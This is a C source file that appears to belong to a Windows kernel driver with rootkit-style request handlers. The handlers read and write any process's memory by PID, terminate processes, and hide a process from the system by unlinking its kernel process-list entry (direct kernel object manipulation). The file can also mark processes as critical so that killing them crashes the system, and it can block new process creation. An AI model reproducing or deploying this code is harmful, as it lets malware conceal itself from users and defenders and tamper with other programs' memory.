//#pragma warning(disable: 4022)
#include "iohandle.h"
#include "events.h"
#include "helper.h"

EXTERN_C NTSTATUS HandleKeReadRequest(PNTSTATUS Status, PULONG ByteIO, PKERNEL_READ_REQUEST ReadInput) {
	PEPROCESS Process;
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	DbgPrintEx(0, 0, "[DEBUG] Get sigread for PID=%ld at %ld!", ReadInput->ProcessID, ReadInput->Address);
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)ReadInput->ProcessID, &Process))) {
		if (NT_SUCCESS(KernelReadProcessMemory(Process, (PVOID)ReadInput->Address, (PVOID)ReadInput->pBuff, ReadInput->Size))) {
			stat = STATUS_SUCCESS;
			*ByteIO = sizeof(KERNEL_READ_REQUEST);
		}
	}
	*Status = stat;
	return stat;
}

EXTERN_C NTSTATUS HandleKeWriteRequest(PNTSTATUS Status, PULONG ByteIO, PKERNEL_WRITE_REQUEST ReadInput) {
	PEPROCESS Process;
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	DbgPrintEx(0, 0, "[DEBUG] Get write request to process with PID=%ld at 0x%x!", ReadInput->ProcessID, ReadInput->Address);
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)ReadInput->ProcessID, &Process))) {
		if NT_SUCCESS(KernelWriteProcessMemory(Process, ReadInput->pBuff, (PVOID)ReadInput->Address, ReadInput->Size)) {
			stat = STATUS_SUCCESS;
			*ByteIO = sizeof(KERNEL_READ_REQUEST);
		}
	}
	*Status = stat;
	return stat;
}
EXTERN_C NTSTATUS HandleKeKillProcessRequest(PNTSTATUS Status, PKERNEL_KILL_PROCESS_REQUEST ReadInput) {
	DbgPrintEx(0, 0, "[DEBUG] Get sigkill with pid=%ld!", ReadInput->ProcId);
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	HANDLE hProcess;
	/*if (NT_SUCCESS(stat = OpenProcess(&hProcess, ReadInput->ProcId))) {
		if (NT_SUCCESS(stat = ZwTerminateProcess(hProcess, 0))) {
			stat = STATUS_SUCCESS;
		}
		else DbgPrintEx(0, 0, "ZwTermitaProcess failed!");
	}
	else DbgPrintEx(0, 0, "OpenProcess failed!");
	*/
	DbgPrintEx(0, 0, "OpenProcess returned %x", stat = OpenProcess(&hProcess, ReadInput->ProcId));
	DbgPrintEx(0, 0, "ZwTerminateProcess returned %x", stat = ZwTerminateProcess(hProcess, 0));
	
	*Status = stat;
	return stat;
}
EXTERN_C NTSTATUS HandleKeHideProcessRequest(PKERNEL_HIDE_PROCESS_REQUEST ReadInput) {

	UINT32 pid = ReadInput->ProcId;
	DbgPrintEx(0, 0, "[DEBUG] Get sighide with pid=%ld!", ReadInput->ProcId);

	// Get PID offset nt!_EPROCESS.UniqueProcessId
	ULONG PID_OFFSET = find_eprocess_pid_offset();

	// Check if offset discovery was successful 
	if (PID_OFFSET == 0) {
		return STATUS_UNSUCCESSFUL;
	}
	ULONG LIST_OFFSET = PID_OFFSET;
	INT_PTR ptr;
	LIST_OFFSET += sizeof(ptr);
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	if (*(UINT32*)CurrentPID == pid) {
		remove_links(CurrentList);
		return STATUS_SUCCESS;
	}
	PEPROCESS StartProcess = CurrentEPROCESS;
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
		if (*(UINT32*)CurrentPID == pid) {
			remove_links(CurrentList);
			return STATUS_SUCCESS;
		}
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}
	return STATUS_SUCCESS;
}

EXTERN_C ULONG find_eprocess_pid_offset() {
	ULONG pid_ofs = 0;
	int idx = 0;
	ULONG pids[3];
	PEPROCESS eprocs[3];
	for (int i = 16; idx < 3; i += 4)
	{
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
		{
			pids[idx] = i;
			idx++;
		}
	}

	for (int i = 0x20; i < 0x300; i += 4)
	{
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i;
			break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);

	return pid_ofs;
}



//this is giong to run inside the target process
KSTART_ROUTINE SetProcessCriticalStatRoutine;
void SetProcessCriticalStatRoutine(PVOID StartContext)
{
	int BreakOnTermination = 1;
	NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
}

//this is giong to run inside the target process
KSTART_ROUTINE DeleteProcessCriticalStatRoutine;
void DeleteProcessCriticalStatRoutine(PVOID StartContext)
{
	int BreakOnTermination = 0;
	NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
}

EXTERN_C NTSTATUS HandleSetProcessCriticalStatRequest(PNTSTATUS Status, PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST ReadInput) {
	HANDLE hThread;
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	HANDLE hProcess;
	if (NT_SUCCESS(OpenProcess(&hProcess, ReadInput->ProcId))) {
		if (NT_SUCCESS(PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, NULL, SetProcessCriticalStatRoutine, NULL))) {
			stat = STATUS_SUCCESS;
			ZwClose(hThread);
		}
	}
	*Status = stat;
	return stat;
}
EXTERN_C NTSTATUS HandleDeleteProcessCriticalStatRequest(PNTSTATUS Status, PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST ReadInput) {
	HANDLE hThread;
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	HANDLE hProcess;
	if (NT_SUCCESS(OpenProcess(&hProcess, ReadInput->ProcId))) {
		if (NT_SUCCESS(PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, NULL, DeleteProcessCriticalStatRoutine, NULL))) {
			stat = STATUS_SUCCESS;
			ZwClose(hThread);
		}
	}
	*Status = stat;
	return stat;
}

NTSTATUS HandleLockdownProcessCreation(PNTSTATUS Status) {
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	if (NT_SUCCESS(PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)ProcessCreationCallback, 1))) {
		if (NT_SUCCESS(PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)ProcessCreationCallbackForbidden, 0))) {
			stat = STATUS_SUCCESS;
		}
	}
	*Status = stat;
	return  stat;
}

NTSTATUS HandleUnlockProcessCreation(PNTSTATUS Status) {
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	if (NT_SUCCESS(PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)ProcessCreationCallbackForbidden, 1))) {
		if (NT_SUCCESS(PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)ProcessCreationCallback, 0))) {
			stat = STATUS_SUCCESS;
		}
	}
	*Status = stat;
	return  stat;
}
